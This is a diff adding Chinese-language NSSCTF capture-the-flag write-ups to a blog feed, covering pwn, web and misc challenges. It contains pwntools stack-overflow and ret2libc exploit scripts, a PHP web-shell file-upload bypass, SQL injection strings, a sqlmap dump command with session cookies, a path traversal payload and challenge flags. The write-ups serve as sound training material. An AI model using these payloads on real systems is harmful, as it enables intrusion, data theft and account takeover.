@@ -100,6 +100,21 @@
 <p>上 payload :</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;Debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露 __libc_start_main 的地址并返回 main 函数方便打第二个 payload</span></span><br><span class="line">leak_libc_start = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, leak_libc_start)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># LibcSearcher 算出偏移，拿到 system 和 /bin/sh 的真实地址</span></span><br><span class="line">libc_start_main_addr =  u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libc_base_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
+<h3 id="NSSCTF-UUCTF-2022-新生赛-easystack"><a href="#NSSCTF-UUCTF-2022-新生赛-easystack" class="headerlink" title="NSSCTF [UUCTF 2022 新生赛] easystack"></a>NSSCTF [UUCTF 2022 新生赛] easystack</h3><p>checksec 发现开了 PIE .</p>
+<p>IDA 打开，发现有给 backdoor , vuln 里有一个栈溢出。</p>
+<p>因为开了 PIE ，只能得到 backdoor 地址的两个字节，最后那个需要爆破</p>
+<p>上 payload :</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;Debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./prog/easystack&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x1185</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x108</span> + p32(backdoor_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>多爆一会就能 getshell 了。</p>
+<p>flag : <code>NSSCTF&#123;ab40ec1d-0dfc-457e-b083-092b74750088&#125;</code></p>
+<h3 id="NSSCTF-MoeCTF-2021-ret2text"><a href="#NSSCTF-MoeCTF-2021-ret2text" class="headerlink" title="NSSCTF [MoeCTF 2021] ret2text"></a>NSSCTF [MoeCTF 2021] ret2text</h3><p>有 backdoor , 啥也没开</p>
+<p>主函数里有一个栈溢出。</p>
+<p>因为是 amd64 , ROPgadget 找个 ret 对齐一下才可以打通。</p>
+<p>上 payload ：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;Debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./prog/ret2text2&quot;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>, port)</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x400687</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x400546</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">18</span>, ret_addr, backdoor_addr])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>flag : <code>NSSCTF&#123;42773a7c-c05d-4482-9df0-7b9ab4c49d47&#125;</code></p>
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="NSSCTF-GKCTF-2020-cve-版签到"><a href="#NSSCTF-GKCTF-2020-cve-版签到" class="headerlink" title="NSSCTF [GKCTF 2020] cve 版签到"></a>NSSCTF [GKCTF 2020] cve 版签到</h3><p>热身题：</p>
 <p><img src="/../resources/images/2024-12_assert/1.webp"></p>
 <p>题目限制了我们只可以访问以 <code>.ctfhub.com</code>结尾的 url.</p>
@@ -148,6 +163,56 @@
 <h3 id="NSSCTF-HGAME-2023-week1-Classic-Childhood-Game"><a href="#NSSCTF-HGAME-2023-week1-Classic-Childhood-Game" class="headerlink" title="NSSCTF [HGAME 2023 week1] Classic Childhood Game"></a>NSSCTF [HGAME 2023 week1] Classic Childhood Game</h3><p>前端题，代码审计。</p>
 <p>在 <code>Event.js</code> 里审到一个 <code>mota()</code> 很可疑，控制台运行一下：</p>
 <p><img src="/../resources/images/2024-12_assert/5.webp"></p>
+<h3 id="NSSCTF-FSCTF-2023-是兄弟，就来传你の🐎！"><a href="#NSSCTF-FSCTF-2023-是兄弟，就来传你の🐎！" class="headerlink" title="NSSCTF [FSCTF 2023] 是兄弟，就来传你の🐎！"></a>NSSCTF [FSCTF 2023] 是兄弟，就来传你の🐎！</h3><p>文件上传。</p>
+<p>正常上传一句话木马无效，改传图片马会显示图片过大。</p>
+<p>测试后发现后端有对后缀名和上传文件格式的验证。</p>
+<p>尝试这样打一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;00.gif&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line">GIF&lt;?=`nl /*`;</span><br></pre></td></tr></table></figure>
+
+<p>有回显上传路径，直接访问无效。</p>
+<p>.htaccess 也无法覆写，尝试绕过后缀名黑名单</p>
+<p>尝试 .pht 发现上传成功</p>
+<p>最终 payload :</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;00.pht&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line">GIF&lt;?=`nl /*`;</span><br></pre></td></tr></table></figure>
+
+<p>访问即可得到 flag .<code>NSSCTF&#123;f6c55439-a3f5-4cac-9150-908485db4178&#125;</code></p>
+<h3 id="NSSCTF-LitCTF-2023-Vim-yyds"><a href="#NSSCTF-LitCTF-2023-Vim-yyds" class="headerlink" title="NSSCTF [LitCTF 2023] Vim yyds"></a>NSSCTF [LitCTF 2023] Vim yyds</h3><p>很明显的提示，vim 源码泄露</p>
+<p>访问 &#x2F;.index.php.swp 得到源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;Give_Me_Your_Flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$password</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>🐎都给我塞好了，POST 传个 <code>$password</code> 的 base64 就可以用 <code>$cmd</code> RCE 了</p>
+<p><img src="/../resources/images/2024-12_assert/10.webp"></p>
+<h3 id="NSSCTF-MoeCTF-2022-Sqlmap-boy"><a href="#NSSCTF-MoeCTF-2022-Sqlmap-boy" class="headerlink" title="NSSCTF [MoeCTF 2022] Sqlmap_boy"></a>NSSCTF [MoeCTF 2022] Sqlmap_boy</h3><pre><code>好，我用 SQLmap (bushi)
+</code></pre>
+<p>先用万能密码登录：<code>admin&quot; or 1=1 #</code></p>
+<p>闭合方式可以 F12 找到。</p>
+<p>漏了一个注入点：<code>http://node5.anna.nssctf.cn:port/secrets.php?id=1</code></p>
+<p>直接用 SQLmap 打的话，会打不通，后端会验证 cookie ，所以要加上你登录成功后的 cookie ：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://node5.anna.nssctf.cn:port/secrets.php?id=1&quot;</span> --random-agent --cookie <span class="string">&quot;HMACCOUNT=D9085B78E5D3B21B;Hm_lpvt_648a44a949074de73151ffaa0a832aec=1734506930;Hm_lvt_648a44a949074de73151ffaa0a832aec=1734173647,1734180461,1734440965,1734500731;PHPSESSID=8b2282a7260168a07ece5f3924a24c34&quot;</span> -D moectf -T flag -C flAg -dump</span><br></pre></td></tr></table></figure>
+
+<p><code>NSSCTF&#123;3083258c-28aa-4c14-81c6-bc6103e770ff&#125;</code></p>
+<h3 id="NSSCTF-HUBUCTF-2022-新生赛-ezsql"><a href="#NSSCTF-HUBUCTF-2022-新生赛-ezsql" class="headerlink" title="NSSCTF [HUBUCTF 2022 新生赛] ezsql"></a>NSSCTF [HUBUCTF 2022 新生赛] ezsql</h3><p>dirsearch 扫一下，有源码泄露在 <code>www.tar.gz</code> 里</p>
+<p>漫长的代码审计。。。</p>
+<p>在 <code>update.php</code> 里面发现了华点：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;update users set age=<span class="subst">$_POST</span>[age],nickname=&#x27;<span class="subst">$_POST</span>[nickname]&#x27;,description=&#x27;<span class="subst">$_POST</span>[description]&#x27; where id=<span class="subst">$_SESSION</span>[id]&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>是一个 update 注入，在 <code>age</code> 处。</p>
+<p>同时在 <code>register.php</code> 中我们发现密码被套了一层 MD5 和一层 hex.</p>
+<p><code>age=1,password=0x31333935353233353234356232343937%23</code> 设置所有密码为 <code>123123</code>.</p>
+<p>登录，在 admin 的 description 处发现 flag.</p>
+<p><code>NSSCTF&#123;e9fbc1a8-b509-4925-ac89-821bd2e4d757&#125;</code></p>
+<h3 id="NSSCTF-LitCTF-2024-高亮主题-划掉-背景查看器"><a href="#NSSCTF-LitCTF-2024-高亮主题-划掉-背景查看器" class="headerlink" title="NSSCTF [LitCTF 2024] 高亮主题 ( 划掉 ) 背景查看器"></a>NSSCTF [LitCTF 2024] 高亮主题 ( 划掉 ) 背景查看器</h3><p>Yakit 抓一下主题切换的 Request ，发现是直接请求的 php 文件。</p>
+<p><code>theme=../../../../../../../../../../../flag</code></p>
+<p>一万层目录穿越一把梭.</p>
+<p>flag: <code>NSSCTF&#123;1bdb7278-fdd4-4e35-af6d-f647be26cda5&#125;</code></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="NSSCTF-UTCTF-2020-Observe-closely"><a href="#NSSCTF-UTCTF-2020-Observe-closely" class="headerlink" title="NSSCTF [UTCTF 2020] Observe closely"></a>NSSCTF [UTCTF 2020] Observe closely</h3><p>下载后得到一张图片，分辨率和大小对应不上，猜测藏了东西</p>
+<p>010 Editor 打开，在文件末尾发现：</p>
+<p><img src="/../resources/images/2024-12_assert/6.webp"></p>
+<p><img src="/../resources/images/2024-12_assert/7.webp"></p>
+<p>是一个 zip 压缩包，缺少了文件头，加上去解压：</p>
+<p><img src="/../resources/images/2024-12_assert/8.webp"></p>
+<p>解压出来运行就好。</p>
+<p><img src="/../resources/images/2024-12_assert/9.webp"></p>
 ]]></content>
       <categories>
         <category>Articles</category>
